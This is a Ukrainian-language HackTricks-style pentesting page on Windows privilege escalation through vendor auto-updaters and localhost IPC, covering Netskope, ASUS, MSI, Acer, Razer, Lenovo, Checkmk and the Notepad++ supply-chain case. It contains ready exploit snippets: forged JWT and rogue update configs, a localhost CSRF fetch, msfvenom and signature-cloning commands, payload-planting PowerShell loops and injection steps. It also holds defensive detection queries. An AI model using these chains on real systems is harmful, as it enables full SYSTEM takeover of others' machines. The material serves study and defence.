# Зловживання Enterprise Auto-Updaters і привілейованим IPC (наприклад, Netskope, ASUS та MSI)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас ланцюжків локального підвищення привілеїв у Windows, виявлених в enterprise endpoint agents та updaters, які надають просту поверхню IPC і привілейований update flow. Показовим прикладом є Netskope Client for Windows < R129 (CVE-2025-0309), де користувач із низькими привілеями може змусити виконати enrollment на сервер, контрольований атакувальником, а потім доставити шкідливий MSI, який встановлює SYSTEM service.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ключові ідеї, які можна повторно застосовувати проти подібних продуктів:
- Зловживати localhost IPC привілейованого service, щоб змусити виконати повторний enrollment або reconfiguration на сервер атакувальника.
- Реалізувати update endpoints виробника, доставити rogue Trusted Root CA і вказати updater на шкідливий, “signed” package.
- Обійти слабкі перевірки signer (CN allow-lists), optional digest flags і lax MSI properties.
- Якщо IPC є “encrypted”, вивести key/IV із machine identifiers, доступних для читання всіма, які зберігаються в registry.
- Якщо service обмежує callers за image path/process name, виконати injection у allow-listed process або запустити його suspended і завантажити свою DLL за допомогою мінімального thread-context patch.

---
## 1) Примусове виконання enrollment на сервер атакувальника через localhost IPC

Багато agents постачаються з user-mode UI process, який взаємодіє із SYSTEM service через localhost TCP, використовуючи JSON.

Спостереження в Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Створити JWT enrollment token, claims якого контролюють backend host (наприклад, AddonUrl). Використати alg=None, щоб підпис не був потрібен.
2) Надіслати IPC message, який викликає provisioning command, разом із JWT і tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого rogue-сервера для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка caller ґрунтується на шляху/імені, ініціюйте запит із allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Перехоплення каналу оновлення для запуску коду від імені SYSTEM

Після того як client почне взаємодіяти з вашим сервером, реалізуйте очікувані endpoints і скеруйте його до attacker MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON-конфігурацію з дуже коротким інтервалом updater, наприклад:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA certificate. Service встановлює його до сховища Trusted Root Local Machine.
3) /v2/checkupdate → Передає metadata, що вказує на malicious MSI і fake version.

Обхід поширених перевірок, які трапляються на практиці:
- Signer CN allow-list: service може перевіряти лише те, що Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваш rogue CA може випустити leaf із таким CN і підписати MSI.
- CERT_DIGEST property: додайте benign MSI property із назвою CERT_DIGEST. Під час встановлення enforcement відсутній.
- Optional digest enforcement: config flag (наприклад, check_msi_digest=false) вимикає додаткову cryptographic validation.

Результат: SYSTEM service встановлює ваш MSI із
C:\ProgramData\Netskope\stAgent\data\*.msi
виконуючи arbitrary code від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass lesson: якщо vendor реагує, додаючи allow-list невеликого набору “trusted” domains замість cryptographically authenticating update source, шукайте vendor-owned redirectors або reverse proxies, які все ще дозволяють вам спрямовувати traffic. У випадку Netskope подальше public research показало, що allow-list епохи R129 усе ще можна було обійти через `rproxy.goskope.com`, який проксирував attacker-controlled Azure App Service content. Розглядайте hostname allow-lists як speed bump, а не як trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

Починаючи з R127, Netskope обгортав IPC JSON у поле encryptData, яке виглядає як Base64. Reversing показав AES із key/IV, похідними від registry values, доступних для читання будь-якому user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers можуть відтворити encryption і надсилати valid encrypted commands зі standard user.<sup>[[1]](#references)[[2]](#references)</sup> General tip: якщо agent раптово починає “encrypt” свій IPC, шукайте device IDs, product GUIDs, install IDs у HKLM як material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Деякі services намагаються authenticate peer, визначаючи PID TCP connection і порівнюючи image path/name з allow-listed vendor binaries, розташованими в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два practical bypasses:
- DLL injection в allow-listed process (наприклад, nsdiag.exe) і proxy IPC зсередини нього.
- Spawn allow-listed binary suspended і bootstrap вашої proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити driver-enforced tamper rules.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products часто постачають minifilter/OB callbacks driver (наприклад, Stadrv), який прибирає dangerous rights із handles до protected processes:
- Process: видаляє PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: обмежує до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user-mode loader, який дотримується цих обмежень:
1) CreateProcess vendor binary із CREATE_SUSPENDED.
2) Отримайте handles, які все ще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для process і thread handle з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви patch code у відомому RIP).
3) Перезапишіть ntdll!NtContinue (або інший early, guaranteed-mapped thunk) невеликим stub, який викликає LoadLibraryW для вашого DLL path, а потім повертається назад.
4) ResumeThread, щоб запустити ваш stub in-process і завантажити вашу DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже protected process (ви його створили), policy driver дотримано.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) автоматизує rogue CA, malicious MSI signing і обслуговує необхідні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — custom IPC client, який створює arbitrary (опційно AES-encrypted) IPC messages і містить suspended-process injection для originating з allow-listed binary.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

Під час роботи з новим endpoint agent або motherboard “helper” suite зазвичай достатньо quick workflow, щоб визначити, чи є перед вами перспективна privesc target:<sup>[[6]](#references)</sup>

1) Перерахуйте loopback listeners і зіставте їх із vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Перелічити кандидатів на іменовані канали:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Збирайте дані маршрутизації, що зберігаються в реєстрі та використовуються IPC-серверами на основі плагінів:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Спочатку витягніть назви endpoint-ів, JSON-ключі та ідентифікатори команд із клієнта user-mode. Упаковані frontend-и на Electron/.NET часто розкривають повну схему:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Шукайте фактичний предикат довіри, а не лише шлях виконання коду, який зрештою запускає процес:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Варто пріоритезувати такі patterns:
- `CryptQueryObject`/парсинг сертифікатів без `WinVerifyTrust` зазвичай означає, що “сертифікат існує” було ототожнено з “сертифікат є довіреним”, що дає змогу клонувати сертифікати або застосовувати інші трюки з підробленим підписантом.
- Перевірки підрядків/суфіксів у `Origin`, `Referer`, URL завантажень, назвах процесів або CN підписанта не є автентифікацією. `contains(".vendor.com")` зазвичай можна експлуатувати за допомогою контрольованих атакувальником схожих доменів.
- Якщо GUI із низькими привілеями вирішує, що “файл є довіреним”, а SYSTEM broker лише використовує цей результат, патчинг або повторна реалізація клієнтської DLL/JS часто повністю обходить цю межу (розділена валідація у стилі Razer).
- Якщо broker копіює payload до `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє або планує його запуск із цього шляху, негайно перевіряйте вікна заміни TOCTOU, а також сусідні plugin modules, які надають альтернативні обгортки `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей із великою кількістю named pipes PipeViewer — швидкий спосіб виявити слабкі DACL і pipes, доступні віддалено, перш ніж починати детально реверсити протокол.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує callers лише за PID, шляхом до image або назвою процесу, сприймайте це радше як перешкоду, ніж як межу: ін'єкції в легітимний client або встановлення з'єднання з allow-listed process часто достатньо, щоб пройти перевірки сервера. Для named pipes [ця сторінка про client impersonation і pipe abuse](named-pipe-client-impersonation.md) докладніше описує цей primitive.

---
## 8) Modular add-in brokers, автентифіковані лише підписами vendor (патерн Lenovo Vantage)

Новіша варіація, на яку варто полювати, — **signed-client RPC broker**: desktop process із низькими привілеями, підписаний Lenovo, взаємодіє із SYSTEM service, а service маршрутизує JSON-команди до набору add-ins, описаних у XML, у `%ProgramData%`. Щойно code execution досягнуто **всередині будь-якого прийнятого signed client**, кожен контракт із `runas="system"` стає частиною вашої attack surface.<sup>[[15]](#references)</sup>

Високоцінні primitives, виявлені під час досліджень Lenovo Vantage:
- **Довіра до caller лише тому, що він підписаний vendor**: дослідники досягли автентифікованого контексту, скопіювавши Lenovo-signed EXE у writable directory та виконавши DLL side-load (`profapi.dll`), завдяки чому довільний code запускався всередині client, якому service уже довіряв.
- **Виявлення attack surface на основі manifest**: add-ins оголошуються в `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів запускаються як `SYSTEM`, тому перерахування таких manifests часто швидше розкриває справжні privileged verbs, ніж реверс самого broker.
- **Баги окремих команд за автентифікованим каналом**: опинившись усередині trusted client, дослідники в публічних матеріалах виявили path-traversal + race conditions в update/install verbs, raw-SQL abuse у privileged settings databases і перевірки registry paths на основі підрядків, які давали змогу виконувати записи за межами передбаченого hive.

Корисна recon на цілі:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Практичний висновок: щоразу, коли helper suite надає broker, який спочатку автентифікує **caller process**, а вже потім передає керування десяткам plugin/add-in commands, не зупиняйтеся після обходу front-door trust check. Вивантажте manifest/contract table і fuzz кожен high-privilege verb окремо; автентифікований channel зазвичай приховує кілька bugs другого етапу.

---
## 1) Browser-to-localhost CSRF проти privileged HTTP APIs (ASUS DriverHub)

DriverHub постачається з user-mode HTTP service (ADU.exe) на 127.0.0.1:53000, який очікує browser calls, що надходять із https://driverhub.asus.com. Origin filter просто виконує `string_contains(".asus.com")` для Origin header і download URLs, доступних через `/asus/v1.0/*`. Тому будь-який attacker-controlled host, наприклад `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати state-changing requests із JavaScript.<sup>[[6]](#references)</sup> Див. [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md), щоб ознайомитися з додатковими bypass patterns.

Практичний flow:
1) Зареєструйте domain, який містить `.asus.com`, і розмістіть там malicious webpage.
2) Використайте `fetch` або XHR, щоб викликати privileged endpoint (наприклад, `Reboot`, `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть JSON body, очікуваний handler, — packed frontend JS показує схему нижче.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Навіть наведений нижче PowerShell CLI успішно виконується, якщо підробити заголовок Origin довіреним значенням:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Будь-яке відвідування браузером сайту атакувальника таким чином стає локальним CSRF в 1 клік (або в 0 кліків через `onload`), який керує helper-процесом із правами SYSTEM.

---
## 2) Небезпечна перевірка code-signing і клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, визначені в тілі JSON, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Перевірка URL завантаження повторно використовує ту саму логіку пошуку підрядка, тому `http://updates.asus.com.attacker.tld:8000/payload.exe` приймається. Після завантаження ADU.exe лише перевіряє, чи містить PE-п файл підпис і чи відповідає рядок Subject значенню ASUS, перш ніж запустити його — без `WinVerifyTrust` і без перевірки ланцюжка сертифікатів.

Щоб використати цей процес:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонуйте підписувача ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на домені-двійнику `.asus.com` і запустіть UpdateApp через описаний вище browser CSRF.

Оскільки і фільтри Origin та URL використовують пошук підрядка, а перевірка підписувача лише порівнює рядки, DriverHub завантажує та виконує бінарний файл атакувальника у своєму привілейованому контексті.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU у шляхах копіювання/виконання updater (MSI Center CMD_AutoUpdateSDK)

SYSTEM-сервіс MSI Center надає TCP-протокол, у якому кожен frame має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його handler:
1) Копіює вказаний виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис через `CS_CommonAPI.EX_CA::Verify` (subject сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює scheduled task, який запускає тимчасовий файл від імені SYSTEM з аргументами, контрольованими атакувальником.

Скопійований файл не блокується між перевіркою та `ExecuteTask()`. Атакувальник може:
- Надіслати Frame A, що вказує на легітимний бінарний файл, підписаний MSI (це гарантує успішне проходження перевірки підпису та постановку task у чергу).
- Змагати його з повторюваними повідомленнями Frame B, які вказують на шкідливий payload і перезаписують `MSI Center SDK.exe` одразу після завершення перевірки.

Коли scheduler спрацює, він виконає перезаписаний payload від імені SYSTEM, хоча спочатку було перевірено оригінальний файл. Надійна експлуатація використовує дві goroutine/thread, які надсилають CMD_AutoUpdateSDK доти, доки не буде виграно вікно TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Зловживання custom SYSTEM-level IPC та impersonation (MSI Center + Acer Control Centre)

### Набори TCP-команд MSI Center
- Кожен plugin/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, що зберігається в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти frame вибирають цей компонент, дозволяючи атакувальникам спрямовувати команди до довільних модулів.
- Plugins можуть визначати власні task runners. `Support\API_Support.dll` надає `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і безпосередньо викликає `API_Support.EX_Task::ExecuteTask()` без перевірки підпису — будь-який локальний користувач може вказати на `C:\Users\<user>\Desktop\payload.exe` і гарантовано отримати виконання від імені SYSTEM.
- Перехоплення loopback за допомогою Wireshark або аналіз .NET-бінарних файлів у dnSpy швидко виявляє відповідність Component ↔ command; після цього custom Go/ Python-клієнти можуть повторно відтворювати frames.<sup>[[6]](#references)</sup>

### Named pipes Acer Control Centre та рівні impersonation
- `ACCSvc.exe` (SYSTEM) надає `\\.\pipe\treadstone_service_LightMode`, а його discretionary ACL дозволяє remote clients (наприклад, `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання command ID `7` із шляхом до файлу викликає routine сервісу для створення процесу.
- Client library серіалізує magic terminator byte (113) разом з аргументами. Dynamic instrumentation за допомогою Frida/`TsDotNetLib` (див. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) щодо порад з instrumentation) показує, що native handler перетворює це значення на `SECURITY_IMPERSONATION_LEVEL` і integrity SID перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) переводить виконання до generic branch, який зберігає повний SYSTEM token і встановлює high-integrity SID (`S-1-16-12288`). Тому створений бінарний файл запускається як unrestricted SYSTEM — як локально, так і між машинами.
- Поєднайте це з відкритим installer flag (`Setup.exe -nocheck`), щоб запустити ACC навіть на lab VM і тестувати pipe без hardware постачальника.<sup>[[6]](#references)</sup>

Ці IPC-баги підкреслюють, чому localhost-сервіси повинні забезпечувати mutual authentication (ALPC SIDs, фільтри `ImpersonationLevel=Impersonation`, token filtering), а helper кожного модуля для “запуску довільного бінарного файлу” має використовувати ті самі перевірки підписувача.

---
## 3) COM/IPC “elevator”-helper, що спираються на слабку user-mode validation (Razer Synapse 4)

Razer Synapse 4 додав ще один корисний патерн до цього сімейства: користувач із низькими привілеями може попросити COM-helper запустити процес через `RzUtility.Elevator`, тоді як рішення про довіру делегується user-mode DLL (`simple_service.dll`), а не забезпечується належним чином у privileged boundary.

Спостережуваний шлях експлуатації:
- Створити екземпляр COM-об’єкта `RzUtility.Elevator`.
- Викликати `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити elevated launch.
- У public PoC перевірку PE-підпису всередині `simple_service.dll` patch-ять перед надсиланням запиту, що дозволяє запустити довільний executable, вибраний атакувальником.<sup>[[6]](#references)[[10]](#references)</sup>

Мінімальний виклик PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Загальний висновок: під час reverse engineering “helper” suites не обмежуйтеся localhost TCP або named pipes. Перевіряйте COM-класи з назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з'ясовуйте, чи привілейований сервіс дійсно перевіряє сам target binary, чи лише довіряє результату, обчисленому patchable user-mode client DLL. Цей патерн узагальнюється за межі Razer: будь-яка split design, у якій high-privilege broker отримує рішення allow/deny від low-privilege side, є потенційною поверхнею для privesc.


---
## Передбачуване виконання тимчасового скрипта під час MSI repair (Checkmk Agent / CVE-2024-0670)

Деякі Windows agents досі реалізують привілейовані дії, записуючи тимчасовий `.cmd` у `C:\Windows\Temp` і виконуючи його від імені `SYSTEM`. Якщо ім'я файлу передбачуване, а сервіс небезпечно обробляє вже наявні файли, користувач із низькими привілеями може заздалегідь створити майбутній тимчасовий файл як **лише для читання** та змусити привілейований процес виконати attacker-controlled content замість власного скрипта.

Спостерігалося у вразливих збірках Checkmk Agent:
- шаблон temp-файлу: `cmk_all_<PID>_1.cmd`
- вразливі гілки: `2.0.0`, `2.1.0`, `2.2.0`
- тригер: MSI **repair** кешованого пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Практичний workflow:
1. Оцініть реалістичний діапазон PID на основі поточних ідентифікаторів процесів або PID запущеного агента.
2. Запишіть короткий **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` або перенаправлення через `cmd.exe`; уникайте UTF-16 output від PowerShell для batch-файлів).
3. Розмістіть `C:\Windows\Temp\cmk_all_<PID>_1.cmd` у всьому діапазоні кандидатів і позначте кожен файл як read-only.
4. Запустіть repair кешованого MSI, щоб привілейований сервіс спробував повторно створити, а потім виконати тимчасовий скрипт.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте кешований MSI-файл під `C:\Windows\Installer`, який має випадковий вигляд, із назвою продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Операційні примітки:
- `qwinsta` корисний, коли `msiexec /fa` завершується помилкою з неінтерактивної WinRM shell і потрібно зрозуміти, чи може наявна desktop/disconnected session коректно запустити repair.<sup>[[7]](#references)</sup>
- Цей патерн узагальнюється на інші endpoint agents та updaters, які **розміщують тимчасові scripts у world-writable locations, а згодом виконують їх від імені SYSTEM**. Перевіряйте передбачувані імена, відсутність семантики exclusive create та repair/update flows, які можна запустити на вимогу.

---
## Віддалений supply-chain hijack через слабку перевірку updater (WinGUp / Notepad++)

У період із червня 2025 року до грудня 2025 року attackers, які скомпрометували hosting infrastructure за update flow Notepad++, вибірково надсилали обраним victims malicious manifests. Старіші updaters на базі WinGUp не виконували повну перевірку автентичності update, тому hostile XML response могла перенаправити clients на URLs під контролем attackers. Оскільки client приймав HTTPS content без обов'язкового підтвердження trusted certificate chain і valid PE signature завантаженого installer, victims завантажували та виконували trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Операційний flow (локальний exploit не потрібен):
1. **Infrastructure interception**: скомпрометувати CDN/hosting і відповідати на update checks metadata від attackers, яка вказує на malicious download URL.
2. **Trojanized NSIS**: installer завантажує/виконує payload і зловживає двома execution chains:
- **Bring-your-own signed binary + sideload**: додати signed Bitdefender `BluetoothService.exe` і розмістити malicious `log.dll` у його search path. Коли signed binary запускається, Windows виконує sideload `log.dll`, яка розшифровує та reflectively loads Chrysalis backdoor (захищений Warbird + API hashing для ускладнення static detection).
- **Scripted shellcode injection**: NSIS виконує compiled Lua script, який використовує Win32 APIs (наприклад, `EnumWindowStationsW`) для ін'єкції shellcode та розгортання Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Ключові висновки щодо hardening/detection для будь-якого auto-updater:
- Забезпечте **certificate + signature verification** завантаженого installer (закріпіть vendor signer, відхиляйте невідповідні CN/chain) і підписуйте сам update manifest (наприклад, XMLDSig). Блокуйте redirects, контрольовані manifest, якщо вони не пройшли валідацію.
- Розглядайте **BYO signed binary sideloading** як post-download detection pivot: створюйте alert, коли signed vendor EXE завантажує DLL з іменем поза його canonical install path (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли updater розміщує/виконує installers із temp із non-vendor signatures.
- Відстежуйте **malware-specific artifacts**, спостережувані в цьому chain (корисні як generic pivots): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` до `%TEMP%` та Lua-driven shellcode injection stages.
- Notepad++ посилив WinGUp у v8.8.9 і новіших версіях: тепер отриманий XML підписується (XMLDSig), а новіші builds застосовують certificate + signature verification завантаженого installer замість довіри лише до transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading signed Bitdefender EXE <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор, відмінний від інсталятора Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ці шаблони узагальнюються для будь-якого updater, який приймає unsigned manifests або не фіксує signers інсталятора — network hijack + malicious installer + BYO-signed sideloading забезпечують remote code execution під виглядом “trusted” updates.

---
## Посилання
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
